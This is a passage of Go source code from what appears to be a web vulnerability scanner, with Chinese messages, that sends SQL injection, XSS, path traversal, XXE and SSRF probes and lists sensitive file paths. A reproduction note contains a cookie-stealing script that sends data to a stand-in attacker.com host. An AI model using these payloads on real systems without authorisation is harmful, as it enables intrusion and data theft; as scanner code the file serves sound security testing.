	task.FinishedAt = timePtr(time.Now())
	task.Progress = 100
	a.db.Save(&task)
}

func (a *API) executeWebScan(ctx context.Context, taskID, target string, options map[string]interface{}) {
	if a.networkEngine == nil {
		a.saveScanResult(taskID, target, "error", "high", "网络引擎未初始化", "")
		return
	}

	targetURL := target
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		targetURL = "https://" + targetURL
	}

	resp, err := a.networkEngine.Get(ctx, targetURL)
	if err != nil {
		if strings.Contains(err.Error(), "unsupported protocol scheme") {
			a.saveScanResult(taskID, target, "error", "high",
				"URL格式错误", fmt.Sprintf("目标 %s 缺少协议前缀，请使用 http:// 或 https://", target))
		} else {
			a.saveScanResult(taskID, target, "error", "high", "扫描请求失败", err.Error())
		}
		return
	}

	a.saveScanResult(taskID, target, "web_scan", "info",
		"Web扫描完成",
		fmt.Sprintf("状态码: %d, 响应大小: %d bytes, 耗时: %dms",
			resp.Status, len(resp.Body), resp.Duration))

	a.checkSecurityHeaders(taskID, targetURL, resp)
	a.checkTechStack(taskID, targetURL, resp)
	a.checkSensitiveInfo(taskID, targetURL, resp)
	a.checkCORS(taskID, targetURL, resp)
	a.checkCookies(taskID, targetURL, resp)
	a.checkFormSecurity(taskID, targetURL, resp)

	if resp.Status == 403 || resp.Status == 401 {
		a.saveScanResult(taskID, target, "auth_required", "medium",
			"目标需要认证",
			fmt.Sprintf("状态码: %d, 可能存在未授权访问限制，建议测试认证绕过", resp.Status))
	}

	if resp.Status >= 500 {
		a.saveScanResult(taskID, target, "server_error", "medium",
			"服务器错误",
			fmt.Sprintf("状态码: %d, 目标服务器可能存在配置问题或可利用的错误信息泄露", resp.Status))
	}
}

func (a *API) checkSecurityHeaders(taskID, targetURL string, resp *network.Response) {
	securityHeaders := map[string]struct {
		header      string
		severity    string
		description string
		recommendation string
	}{
		"x-frame-options": {
			header: "X-Frame-Options",
			severity: "medium",
			description: "缺少X-Frame-Options头，可能存在点击劫持风险",
			recommendation: "建议设置: X-Frame-Options: DENY 或 SAMEORIGIN",
		},
		"x-content-type-options": {
			header: "X-Content-Type-Options",
			severity: "low",
			description: "缺少X-Content-Type-Options头，可能导致MIME类型嗅探攻击",
			recommendation: "建议设置: X-Content-Type-Options: nosniff",
		},
		"x-xss-protection": {
			header: "X-XSS-Protection",
			severity: "low",
			description: "缺少X-XSS-Protection头，XSS过滤器未启用",
			recommendation: "建议设置: X-XSS-Protection: 1; mode=block",
		},
		"strict-transport-security": {
			header: "Strict-Transport-Security",
			severity: "medium",
			description: "缺少HSTS头，可能导致SSL剥离攻击",
			recommendation: "建议设置: Strict-Transport-Security: max-age=31536000; includeSubDomains",
		},
		"content-security-policy": {
			header: "Content-Security-Policy",
			severity: "high",
			description: "缺少CSP策略，增加XSS和数据注入攻击风险",
			recommendation: "建议配置严格的CSP策略，限制脚本来源",
		},
		"referrer-policy": {
			header: "Referrer-Policy",
			severity: "low",
			description: "缺少Referrer-Policy头，可能泄露敏感URL信息",
			recommendation: "建议设置: Referrer-Policy: strict-origin-when-cross-origin",
		},
		"permissions-policy": {
			header: "Permissions-Policy",
			severity: "low",
			description: "缺少Permissions-Policy头，浏览器功能权限未限制",
			recommendation: "建议配置Permissions-Policy限制敏感API访问",
		},
	}

	for key, check := range securityHeaders {
		found := false
		for h := range resp.Headers {
			if strings.ToLower(h) == key {
				found = true
				break
			}
		}
		if !found {
			a.saveScanResult(taskID, targetURL, "missing_header", check.severity,
				fmt.Sprintf("缺少安全响应头: %s", check.header),
				fmt.Sprintf("%s | %s", check.description, check.recommendation))
		}
	}
}

func (a *API) checkTechStack(taskID, targetURL string, resp *network.Response) {
	techSignatures := []struct {
		name      string
		signature string
		category  string
	}{
		{"PHP", "php", "后端语言"},
		{"ASP.NET", "asp.net|aspnet", "后端框架"},
		{"Java/Spring", "spring|j_sessionid|jsessionid", "后端框架"},
		{"Python/Django", "csrfmiddlewaretoken|django", "后端框架"},
		{"Python/Flask", "flask", "后端框架"},
		{"Node.js/Express", "express", "后端框架"},
		{"Ruby on Rails", "rails|ruby", "后端框架"},
		{"WordPress", "wordpress|wp-content|wp-includes", "CMS"},
		{"Drupal", "drupal", "CMS"},
		{"Joomla", "joomla", "CMS"},
		{"Vue.js", "vue|vuejs|v-cloak", "前端框架"},
		{"React", "react|reactjs|_react", "前端框架"},
		{"Angular", "angular|ng-|ngApp", "前端框架"},
		{"jQuery", "jquery", "前端库"},
		{"Bootstrap", "bootstrap", "前端框架"},
		{"Nginx", "nginx", "Web服务器"},
		{"Apache", "apache", "Web服务器"},
		{"IIS", "iis|microsoft-iis", "Web服务器"},
		{"Tomcat", "tomcat", "应用服务器"},
		{"MySQL", "mysql", "数据库"},
		{"PostgreSQL", "postgresql|pgsql", "数据库"},
		{"Redis", "redis", "缓存"},
		{"MongoDB", "mongodb", "数据库"},
	}

	bodyLower := strings.ToLower(resp.Body)
	detectedTech := []string{}

	for _, sig := range techSignatures {
		if matched, _ := regexp.MatchString(sig.signature, bodyLower); matched {
			detectedTech = append(detectedTech, fmt.Sprintf("%s (%s)", sig.name, sig.category))
		}
	}

	if server, ok := resp.Headers["Server"]; ok {
		detectedTech = append(detectedTech, fmt.Sprintf("服务器: %s", server))
	}

	if xPowered, ok := resp.Headers["X-Powered-By"]; ok {
		detectedTech = append(detectedTech, fmt.Sprintf("技术栈: %s", xPowered))
	}

	if len(detectedTech) > 0 {
		a.saveScanResult(taskID, targetURL, "tech_detection", "info",
			"技术栈识别",
			fmt.Sprintf("检测到: %s", strings.Join(detectedTech, ", ")))
	}
}

func (a *API) checkSensitiveInfo(taskID, targetURL string, resp *network.Response) {
	sensitivePatterns := []struct {
		name        string
		pattern     string
		severity    string
		description string
	}{
		{"邮箱地址", `[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}`, "low", "页面中包含邮箱地址"},
		{"手机号码", `1[3-9]\d{9}`, "low", "页面中包含手机号码"},
		{"身份证号", `\d{17}[\dXx]`, "medium", "页面中包含身份证号码"},
		{"银行卡号", `\d{16,19}`, "medium", "页面中包含银行卡号"},
		{"API密钥", `api[_-]?key[_-]?[a-zA-Z0-9]{16,}`, "high", "页面中可能包含API密钥"},
		{"AWS密钥", `AKIA[0-9A-Z]{16}`, "critical", "页面中可能包含AWS访问密钥"},
		{"私钥", `-----BEGIN.*PRIVATE KEY-----`, "critical", "页面中可能包含私钥"},
		{"数据库连接串", `(mysql|postgres|mongodb)://[^\s]+`, "high", "页面中可能包含数据库连接串"},
		{"JWT Token", `eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*`, "medium", "页面中包含JWT Token"},
		{"IP地址", `\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}`, "info", "页面中包含IP地址"},
		{"内网IP", `(10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})`, "medium", "页面中包含内网IP地址"},
	}

	for _, pattern := range sensitivePatterns {
		matched, _ := regexp.MatchString(pattern.pattern, resp.Body)
		if matched {
			a.saveScanResult(taskID, targetURL, "sensitive_info", pattern.severity,
				pattern.name,
				pattern.description)
		}
	}
}

func (a *API) checkCORS(taskID, targetURL string, resp *network.Response) {
	allowOrigin, hasAllowOrigin := resp.Headers["Access-Control-Allow-Origin"]
	allowCreds, hasAllowCreds := resp.Headers["Access-Control-Allow-Credentials"]

	if hasAllowOrigin {
		if allowOrigin == "*" {
			severity := "high"
			if hasAllowCreds && allowCreds == "true" {
				severity = "critical"
				a.saveScanResult(taskID, targetURL, "cors_misconfig", severity,
					"CORS配置严重错误",
					"Access-Control-Allow-Origin: * 且 Access-Control-Allow-Credentials: true，可窃取用户敏感数据")
			} else {
				a.saveScanResult(taskID, targetURL, "cors_misconfig", severity,
					"CORS配置过于宽松",
					"Access-Control-Allow-Origin: *，任何源都可以读取响应内容")
			}
		} else {
			a.saveScanResult(taskID, targetURL, "cors_config", "info",
				"CORS配置",
				fmt.Sprintf("Access-Control-Allow-Origin: %s", allowOrigin))
		}
	}
}

func (a *API) checkCookies(taskID, targetURL string, resp *network.Response) {
	setCookie, hasSetCookie := resp.Headers["Set-Cookie"]
	if !hasSetCookie {
		return
	}

	cookieIssues := []string{}
	cookies := strings.Split(setCookie, ";")
	
	for _, cookie := range cookies {
		cookie = strings.TrimSpace(cookie)
		cookieLower := strings.ToLower(cookie)
		
		if strings.Contains(cookieLower, "httponly") == false && len(cookie) > 0 {
			parts := strings.Split(cookie, "=")
			if len(parts) > 0 && parts[0] != "" {
				cookieIssues = append(cookieIssues, fmt.Sprintf("Cookie '%s' 缺少HttpOnly标志", strings.TrimSpace(parts[0])))
			}
		}
		
		if strings.Contains(cookieLower, "secure") == false && strings.HasPrefix(targetURL, "https://") {
			cookieIssues = append(cookieIssues, "Cookie缺少Secure标志")
		}
		
		if strings.Contains(cookieLower, "samesite") == false {
			cookieIssues = append(cookieIssues, "Cookie缺少SameSite属性，存在CSRF风险")
		}
	}

	if len(cookieIssues) > 0 {
		a.saveScanResult(taskID, targetURL, "cookie_security", "medium",
			"Cookie安全配置问题",
			strings.Join(cookieIssues, "; "))
	}
}

func (a *API) checkFormSecurity(taskID, targetURL string, resp *network.Response) {
	formRegex := regexp.MustCompile(`<form[^>]*action=["']([^"']*)["'][^>]*method=["']([^"']*)["'][^>]*>`)
	matches := formRegex.FindAllStringSubmatch(resp.Body, -1)

	for _, match := range matches {
		if len(match) >= 3 {
			action := match[1]
			method := strings.ToUpper(match[2])
			
			if strings.HasPrefix(targetURL, "https://") && strings.HasPrefix(action, "http://") {
				a.saveScanResult(taskID, targetURL, "mixed_content", "medium",
					"混合内容风险",
					fmt.Sprintf("表单提交到不安全的HTTP地址: %s", action))
			}
			
			if method == "GET" {
				actionLower := strings.ToLower(action)
				if strings.Contains(actionLower, "login") || strings.Contains(actionLower, "password") || 
				   strings.Contains(actionLower, "auth") || strings.Contains(actionLower, "signin") {
					a.saveScanResult(taskID, targetURL, "insecure_form", "medium",
						"不安全的表单提交方式",
						"敏感表单使用GET方法提交，凭据可能被记录到日志或浏览器历史")
				}
			}
		}
	}

	csrfTokenPatterns := []string{
		`csrf[_-]?token`,
		`csrf[_-]?middleware[_-]?token`,
		`_token`,
		`authenticity[_-]?token`,
		`__RequestVerificationToken`,
	}
	
	hasCSRFToken := false
	for _, pattern := range csrfTokenPatterns {
		if matched, _ := regexp.MatchString(pattern, strings.ToLower(resp.Body)); matched {
			hasCSRFToken = true
			break
		}
	}
	
	if !hasCSRFToken && len(matches) > 0 {
		a.saveScanResult(taskID, targetURL, "csrf_token", "medium",
			"可能缺少CSRF防护",
			"未检测到CSRF Token，表单可能存在CSRF漏洞风险")
	}
}

func (a *API) executePortScan(ctx context.Context, taskID, target string, options map[string]interface{}) {
	if a.networkEngine == nil {
		a.saveScanResult(taskID, target, "error", "high", "网络引擎未初始化", "")
		return
	}

	a.saveScanResult(taskID, target, "port_scan", "info", "开始端口扫描", "扫描常见高危端口和服务")

	commonPorts := []int{
		21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995,
		1723, 3306, 3389, 5900, 8080, 8443, 8888, 9000, 9200, 27017,
	}

	openPorts := a.networkEngine.ScanPorts(target, commonPorts, 50)

	for _, result := range openPorts {
		if result.Open {
			riskLevel := "info"
			title := fmt.Sprintf("端口开放: %s", result.Service)

			if isHighRiskPort(result.Port) {
				riskLevel = "high"
				title = fmt.Sprintf("高危端口开放: %s", result.Service)
			}

			bannerInfo := result.Banner
			if bannerInfo == "" {
				bannerInfo = "无法获取Banner信息"
			}

			a.saveScanResult(taskID, fmt.Sprintf("%s:%d", target, result.Port), "port_open", riskLevel,
				title,
				fmt.Sprintf("端口: %d, 服务: %s, Banner: %s", result.Port, result.Service, bannerInfo))
		}
	}

	if len(openPorts) == 0 {
		a.saveScanResult(taskID, target, "port_scan", "info", "端口扫描完成", "未发现开放端口")
	} else {
		a.saveScanResult(taskID, target, "port_scan", "info", "端口扫描完成",
			fmt.Sprintf("共发现 %d 个开放端口", len(openPorts)))
	}
}

func isHighRiskPort(port int) bool {
	highRiskPorts := map[int]bool{
		21:   true,
		23:   true,
		445:  true,
		3389: true,
		5900: true,
		27017: true,
		9200: true,
		3306: true,
		1433: true,
		5432: true,
	}
	return highRiskPorts[port]
}

func (a *API) executeVulnScan(ctx context.Context, taskID, target string, options map[string]interface{}) {
	if a.networkEngine == nil {
		a.saveScanResult(taskID, target, "error", "high", "网络引擎未初始化", "")
		return
	}

	a.saveScanResult(taskID, target, "vuln_scan", "info", "开始漏洞检测", "基于OWASP Top 10的专业检测")

	targetURL := target
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		targetURL = "https://" + targetURL
	}

	sensitiveFiles := []struct {
		name        string
		paths       []string
		severity    string
		description string
		indicators  []string
	}{
		{
			name:        "Git仓库泄露",
			paths:       []string{"/.git/config", "/.git/HEAD", "/.git/description"},
			severity:    "high",
			description: "Git仓库配置文件可访问，可能泄露源代码",
			indicators:  []string{"[core]", "[remote", "repositoryurl", "ref:"},
		},
		{
			name:        "环境配置泄露",
			paths:       []string{"/.env", "/.env.local", "/.env.production", "/.env.development"},
			severity:    "critical",
			description: "环境配置文件泄露，可能包含数据库密码、API密钥等敏感信息",
			indicators:  []string{"APP_KEY", "DB_PASSWORD", "SECRET", "API_KEY", "PASSWORD", "TOKEN"},
		},
		{
			name:        "备份文件泄露",
			paths:       []string{"/backup.zip", "/backup.sql", "/backup.tar.gz", "/backup.tar", "/db.sql", "/database.sql"},
			severity:    "high",
			description: "备份文件可下载，可能包含敏感数据或源代码",
			indicators:  []string{"PK", "MySQL", "SQLite", "PostgreSQL"},
		},
		{
			name:        "配置文件泄露",
			paths:       []string{"/config.php", "/configuration.php", "/settings.php", "/config.yml", "/config.yaml", "/config.json"},
			severity:    "high",
			description: "配置文件可访问，可能包含数据库连接信息",
			indicators:  []string{"database", "password", "secret", "host", "username"},
		},
		{
			name:        "日志文件泄露",
			paths:       []string{"/error.log", "/access.log", "/debug.log", "/app.log", "/server.log"},
			severity:    "medium",
			description: "日志文件可访问，可能包含敏感路径或错误信息",
			indicators:  []string{"error", "warning", "exception", "trace", "stack"},
		},
		{
			name:        "敏感目录探测",
			paths:       []string{"/admin", "/administrator", "/manager", "/console", "/dashboard", "/control"},
			severity:    "medium",
			description: "发现管理后台入口，建议测试弱口令和认证绕过",
			indicators:  []string{"login", "admin", "password", "username", "signin"},
		},
		{
			name:        "API文档泄露",
			paths:       []string{"/swagger", "/swagger-ui", "/api-docs", "/swagger.json", "/openapi.json", "/graphql"},
			severity:    "medium",
			description: "API文档可访问，可能泄露接口信息和参数结构",
			indicators:  []string{"swagger", "openapi", "api", "graphql", "endpoints"},
		},
		{
			name:        "调试信息泄露",
			paths:       []string{"/debug", "/trace", "/actuator", "/status", "/health", "/info"},
			severity:    "medium",
			description: "调试端点可访问，可能泄露服务器配置信息",
			indicators:  []string{"debug", "trace", "stack", "memory", "version", "java"},
		},
		{
			name:        "WebShell后门",
			paths:       []string{"/shell.php", "/cmd.php", "/backdoor.php", "/webshell.php", "/c99.php", "/r57.php"},
			severity:    "critical",
			description: "发现可疑WebShell文件，可能已被植入后门",
			indicators:  []string{"shell", "cmd", "exec", "eval", "system", "passthru"},
		},
		{
			name:        "敏感信息端点",
			paths:       []string{"/.svn/entries", "/.hg/store", "/CVS/Root", "/.bzr/checkout", "/WEB-INF/web.xml"},
			severity:    "high",
			description: "版本控制或配置文件可访问",
			indicators:  []string{"svn", "hg", "cvs", "bzr", "web-app", "servlet"},
		},
		{
			name:        "PHP信息泄露",
			paths:       []string{"/phpinfo.php", "/info.php", "/test.php", "/php.php"},
			severity:    "medium",
			description: "PHP配置信息可访问，泄露服务器配置",
			indicators:  []string{"phpinfo", "PHP Version", "Configuration", "extension"},
		},
		{
			name:        "服务器状态",
			paths:       []string{"/server-status", "/server-info", "/.htaccess", "/.htpasswd"},
			severity:    "medium",
			description: "Apache服务器状态或配置文件可访问",
			indicators:  []string{"Server Status", "Apache", "htaccess", "AuthUserFile"},
		},
	}

	for _, check := range sensitiveFiles {
		for _, path := range check.paths {
			req := &network.Request{
				Method: "GET",
				URL:    targetURL + path,
			}

			resp, err := a.networkEngine.DoRequest(ctx, req)
			if err != nil {
				continue
			}

			if resp.Status == 200 {
				bodyLower := strings.ToLower(resp.Body)
				found := false
				for _, indicator := range check.indicators {
					if strings.Contains(bodyLower, strings.ToLower(indicator)) {
						found = true
						break
					}
				}

				if found {
					a.saveScanResult(taskID, targetURL+path, "vuln_detected", check.severity,
						fmt.Sprintf("[%s] %s", strings.ToUpper(check.severity), check.name),
						fmt.Sprintf("%s | 路径: %s", check.description, path))
				}
			}
		}
	}

	a.checkSQLInjection(ctx, taskID, targetURL)
	a.checkXSS(ctx, taskID, targetURL)
	a.checkDirectoryTraversal(ctx, taskID, targetURL)
	a.checkXXE(ctx, taskID, targetURL)
	a.checkSSRF(ctx, taskID, targetURL)

	a.saveScanResult(taskID, target, "vuln_scan", "info", "漏洞检测完成", 
		fmt.Sprintf("已完成 %d 项敏感文件检测 + SQL注入/XSS/目录遍历/XXE/SSRF检测", len(sensitiveFiles)))
}

func (a *API) checkSQLInjection(ctx context.Context, taskID, targetURL string) {
	sqlPayloads := []struct {
		payload     string
		name        string
		indicators  []string
	}{
		{"'", "单引号注入", []string{"sql syntax", "mysql", "syntax error", "unclosed quotation", "ORA-", "PLS-"}},
		{"\"", "双引号注入", []string{"sql syntax", "syntax error", "unclosed quotation"}},
		{"' OR '1'='1", "OR注入", []string{"sql syntax", "mysql", "query"}},
		{"' UNION SELECT NULL--", "UNION注入", []string{"sql syntax", "mysql", "column"}},
		{"1' AND '1'='1", "AND注入", []string{"sql syntax", "mysql"}},
		{"'; DROP TABLE users--", "DROP注入", []string{"sql syntax", "mysql"}},
		{"1 OR 1=1", "数值OR注入", []string{"sql syntax", "mysql"}},
		{"admin'--", "注释注入", []string{"sql syntax", "mysql"}},
	}

	testParams := []string{"id", "user", "page", "search", "query", "cat", "file", "item"}

	for _, param := range testParams {
		for _, payload := range sqlPayloads {
			testURL := fmt.Sprintf("%s?%s=%s", targetURL, param, payload.payload)
			
			req := &network.Request{
				Method: "GET",
				URL:    testURL,
			}

			resp, err := a.networkEngine.DoRequest(ctx, req)
			if err != nil {
				continue
			}

			bodyLower := strings.ToLower(resp.Body)
			for _, indicator := range payload.indicators {
				if strings.Contains(bodyLower, indicator) {
					a.saveScanResult(taskID, testURL, "sql_injection", "critical",
						"[CRITICAL] SQL注入漏洞",
						fmt.Sprintf("参数 '%s' 存在SQL注入风险，Payload: %s，错误信息包含: %s", 
							param, payload.name, indicator))
					break
				}
			}
		}
	}
}

func (a *API) checkXSS(ctx context.Context, taskID, targetURL string) {
	xssPayloads := []struct {
		payload    string
		name       string
		severity   string
	}{
		{"<script>alert('XSS')</script>", "反射型XSS-Script标签", "high"},
		{"<img src=x onerror=alert('XSS')>", "反射型XSS-Img标签", "high"},
		{"<svg onload=alert('XSS')>", "反射型XSS-SVG标签", "high"},
		{"javascript:alert('XSS')", "反射型XSS-JavaScript协议", "high"},
		{"'><script>alert('XSS')</script>", "反射型XSS-属性注入", "high"},
		{"\"><script>alert('XSS')</script>", "反射型XSS-双引号注入", "high"},
		{"<body onload=alert('XSS')>", "反射型XSS-Body标签", "medium"},
		{"<iframe src='javascript:alert(1)'>", "反射型XSS-Iframe标签", "medium"},
	}

	testParams := []string{"q", "search", "query", "name", "message", "input", "text", "content"}

	for _, param := range testParams {
		for _, payload := range xssPayloads {
			testURL := fmt.Sprintf("%s?%s=%s", targetURL, param, payload.payload)
			
			req := &network.Request{
				Method: "GET",
				URL:    testURL,
			}

			resp, err := a.networkEngine.DoRequest(ctx, req)
			if err != nil {
				continue
			}

			if strings.Contains(resp.Body, payload.payload) {
				a.saveScanResult(taskID, testURL, "xss", payload.severity,
					fmt.Sprintf("[%s] XSS跨站脚本漏洞", strings.ToUpper(payload.severity)),
					fmt.Sprintf("参数 '%s' 存在XSS漏洞，Payload未过滤直接输出: %s", param, payload.name))
			}
		}
	}
}

func (a *API) checkDirectoryTraversal(ctx context.Context, taskID, targetURL string) {
	traversalPayloads := []struct {
		payload    string
		name       string
		targetFile string
	}{
		{"../../../etc/passwd", "Linux passwd文件", "root:"},
		{"..\\..\\..\\windows\\system32\\config\\sam", "Windows SAM文件", ""},
		{"../../../etc/shadow", "Linux shadow文件", "root:"},
		{"....//....//....//etc/passwd", "双点绕过", "root:"},
		{"..%2f..%2f..%2fetc/passwd", "URL编码绕过", "root:"},
		{"..%252f..%252f..%252fetc/passwd", "双重URL编码绕过", "root:"},
		{"../../../var/log/apache2/access.log", "Apache日志文件", ""},
		{"../../../proc/self/environ", "Proc环境变量", ""},
	}

	testParams := []string{"file", "path", "page", "template", "doc", "document", "folder", "name"}

	for _, param := range testParams {
		for _, payload := range traversalPayloads {
			testURL := fmt.Sprintf("%s?%s=%s", targetURL, param, payload.payload)
			
			req := &network.Request{
				Method: "GET",
				URL:    testURL,
			}

			resp, err := a.networkEngine.DoRequest(ctx, req)
			if err != nil {
				continue
			}

			if resp.Status == 200 && payload.targetFile != "" {
				if strings.Contains(resp.Body, payload.targetFile) {
					a.saveScanResult(taskID, testURL, "directory_traversal", "critical",
						"[CRITICAL] 目录遍历漏洞",
						fmt.Sprintf("参数 '%s' 存在目录遍历漏洞，可读取: %s", param, payload.name))
				}
			}
		}
	}
}

func (a *API) checkXXE(ctx context.Context, taskID, targetURL string) {
	xxePayloads := []struct {
		contentType string
		payload     string
		name        string
	}{
		{
			"application/xml",
			`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>`,
			"XML外部实体注入-文件读取",
		},
		{
			"application/xml",
			`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080">]>
<root>&xxe;</root>`,
			"XML外部实体注入-SSRF",
		},
		{
			"text/xml",
			`<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
			"XML外部实体注入-简化版",
		},
	}

	for _, payload := range xxePayloads {
		req := &network.Request{
			Method: "POST",
			URL:    targetURL,
			Headers: map[string]string{
				"Content-Type": payload.contentType,
			},
			Body: payload.payload,
		}

		resp, err := a.networkEngine.DoRequest(ctx, req)
		if err != nil {
			continue
		}

		if strings.Contains(resp.Body, "root:") || strings.Contains(resp.Body, "passwd") {
			a.saveScanResult(taskID, targetURL, "xxe", "critical",
				"[CRITICAL] XXE外部实体注入漏洞",
				fmt.Sprintf("存在XXE漏洞: %s，可读取系统文件", payload.name))
		}
	}
}

func (a *API) checkSSRF(ctx context.Context, taskID, targetURL string) {
	ssrfPayloads := []struct {
		payload string
		name    string
	}{
		{"http://127.0.0.1", "本地回环地址"},
		{"http://localhost", "localhost"},
		{"http://[::1]", "IPv6回环地址"},
		{"http://0.0.0.0", "0.0.0.0地址"},
		{"http://169.254.169.254", "AWS元数据服务"},
		{"http://metadata.google.internal", "GCP元数据服务"},
		{"http://169.254.169.254/latest/meta-data/", "AWS元数据API"},
		{"dict://127.0.0.1:6379/info", "Redis服务探测"},
		{"gopher://127.0.0.1:6379/_INFO", "Gopher协议攻击Redis"},
	}

	testParams := []string{"url", "uri", "target", "domain", "host", "link", "src", "source", "dest", "redirect"}

	for _, param := range testParams {
		for _, payload := range ssrfPayloads {
			testURL := fmt.Sprintf("%s?%s=%s", targetURL, param, payload.payload)
			
			req := &network.Request{
				Method: "GET",
				URL:    testURL,
			}

			resp, err := a.networkEngine.DoRequest(ctx, req)
			if err != nil {
				continue
			}

			if resp.Status == 200 {
				bodyLower := strings.ToLower(resp.Body)
				indicators := []string{"ami-id", "instance-id", "local-hostname", "local-ipv4", "redis_version", "aws", "metadata"}
				
				for _, indicator := range indicators {
					if strings.Contains(bodyLower, indicator) {
						a.saveScanResult(taskID, testURL, "ssrf", "critical",
							"[CRITICAL] SSRF服务端请求伪造漏洞",
							fmt.Sprintf("参数 '%s' 存在SSRF漏洞，可访问: %s，响应包含敏感信息: %s", 
								param, payload.name, indicator))
						break
					}
				}
			}
		}
	}
}

func (a *API) saveScanResult(taskID, target, resultType, severity, title, description string) {
	result := models.ScanResult{
		ID:          uuid.New().String(),
		TaskID:      taskID,
		Target:      target,
		URL:         target,
		Type:        resultType,
		Title:       title,
		Description: description,
		Data:        fmt.Sprintf("[%s] %s - %s", severity, title, description),
		Severity:    severity,
	}

	vulnInfo := a.generateVulnDetails(resultType, severity, title, description, target)
	result.ReproduceSteps = vulnInfo.ReproduceSteps
	result.FixSuggestion = vulnInfo.FixSuggestion
	result.References = vulnInfo.References
	result.Payload = vulnInfo.Payload
	result.CVEID = vulnInfo.CVEID
	result.Tags = vulnInfo.Tags
	result.RiskLevel = vulnInfo.RiskLevel

	a.db.Create(&result)
}

type VulnDetails struct {
	ReproduceSteps string
	FixSuggestion  string
	References     string
	Payload        string
	CVEID          string
	Tags           string
	RiskLevel      int
}

func (a *API) generateVulnDetails(resultType, severity, title, description, target string) VulnDetails {
	details := VulnDetails{}

	switch resultType {
	case "sql_injection":
		details.ReproduceSteps = fmt.Sprintf(`【SQL注入漏洞复现步骤】

1. 访问目标URL: %s
2. 在参数中注入单引号 ' 观察是否报错
3. 使用Payload: ' OR '1'='1 进行测试
4. 使用UNION SELECT语句获取数据
5. 使用sqlmap工具自动化利用:
   sqlmap -u "%s" --dbs

【危害等级】%s
【风险说明】攻击者可获取数据库全部数据，包括用户密码、敏感信息等`, target, target, severity)
		details.FixSuggestion = `【修复建议】
1. 使用参数化查询或ORM框架
2. 对用户输入进行严格过滤
3. 使用WAF防护
4. 最小权限原则配置数据库账户
5. 敏感数据加密存储`
		details.References = `https://owasp.org/www-community/attacks/SQL_Injection
https://portswigger.net/web-security/sql-injection`
		details.Tags = "sqli,injection,database"
		details.RiskLevel = 10

	case "xss":
		details.ReproduceSteps = fmt.Sprintf(`【XSS跨站脚本漏洞复现步骤】

1. 访问目标URL: %s
2. 在参数中注入Payload: <script>alert('XSS')</script>
3. 观察页面是否弹出警告框
4. 尝试窃取Cookie: <script>document.location='http://attacker.com/cookie?'+document.cookie</script>

【危害等级】%s
【风险说明】攻击者可窃取用户Cookie、Session，执行恶意操作`, target, severity)
		details.FixSuggestion = `【修复建议】
1. 对用户输入进行HTML实体编码
2. 配置Content-Security-Policy响应头
3. 设置HttpOnly和Secure的Cookie属性
4. 使用XSS过滤器`
		details.References = `https://owasp.org/www-community/attacks/xss/
https://portswigger.net/web-security/cross-site-scripting`
		details.Tags = "xss,injection,client-side"
		details.RiskLevel = 8

	case "directory_traversal":
		details.ReproduceSteps = fmt.Sprintf(`【目录遍历漏洞复现步骤】

1. 访问目标URL: %s
2. 在文件参数中注入: ../../../etc/passwd
3. 观察是否返回系统文件内容
4. 尝试读取其他敏感文件

【危害等级】%s
【风险说明】攻击者可读取任意文件，获取敏感配置信息`, target, severity)
		details.FixSuggestion = `【修复建议】
1. 验证用户输入的文件路径
2. 使用白名单限制可访问文件
3. 过滤../等特殊字符
4. 使用chroot限制访问范围`
		details.References = `https://owasp.org/www-community/attacks/Path_Traversal
https://portswigger.net/web-security/file-path-traversal`
		details.Tags = "lfi,traversal,file-read"
		details.RiskLevel = 9

	case "xxe":
		details.ReproduceSteps = fmt.Sprintf(`【XXE外部实体注入漏洞复现步骤】

1. 访问目标URL: %s
2. 发送包含XML的POST请求
3. 注入Payload:
   <?xml version="1.0"?>
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
   <root>&xxe;</root>
4. 观察响应是否包含文件内容

【危害等级】%s
【风险说明】攻击者可读取任意文件、发起SSRF攻击、可能导致RCE`, target, severity)
		details.FixSuggestion = `【修复建议】
1. 禁用XML外部实体处理
2. 使用JSON替代XML
3. 升级XML解析器
4. 禁用DOCTYPE声明`
		details.References = `https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
https://portswigger.net/web-security/xxe`
		details.Tags = "xxe,xml,ssrf"
		details.RiskLevel = 10

	case "ssrf":
		details.ReproduceSteps = fmt.Sprintf(`【SSRF服务端请求伪造漏洞复现步骤】

1. 访问目标URL: %s
2. 在URL参数中注入: http://127.0.0.1
3. 尝试访问云元数据: http://169.254.169.254/latest/meta-data/
4. 尝试探测内网服务

【危害等级】%s
【风险说明】攻击者可探测内网、访问云元数据、攻击内部服务`, target, severity)
		details.FixSuggestion = `【修复建议】
1. 验证和限制用户提供的URL
2. 禁止访问内网IP和云元数据地址
3. 使用白名单限制可访问域名
4. 在防火墙层面阻断可疑请求`
		details.References = `https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
https://portswigger.net/web-security/ssrf`
		details.Tags = "ssrf,request-forgery"
		details.RiskLevel = 9

	case "cors_misconfig":
		details.ReproduceSteps = fmt.Sprintf(`【CORS配置错误复现步骤】

1. 访问目标URL: %s
2. 发送请求头: Origin: http://attacker.com
3. 观察响应头: Access-Control-Allow-Origin: *
4. 如果Allow-Credentials为true，可窃取用户数据

【危害等级】%s
【风险说明】攻击者可跨域读取用户敏感数据`, target, severity)
		details.FixSuggestion = `【修复建议】
1. 限制Access-Control-Allow-Origin为可信域名
2. 避免使用通配符*
3. 不要同时设置Allow-Origin: * 和 Allow-Credentials: true
4. 使用白名单验证Origin`
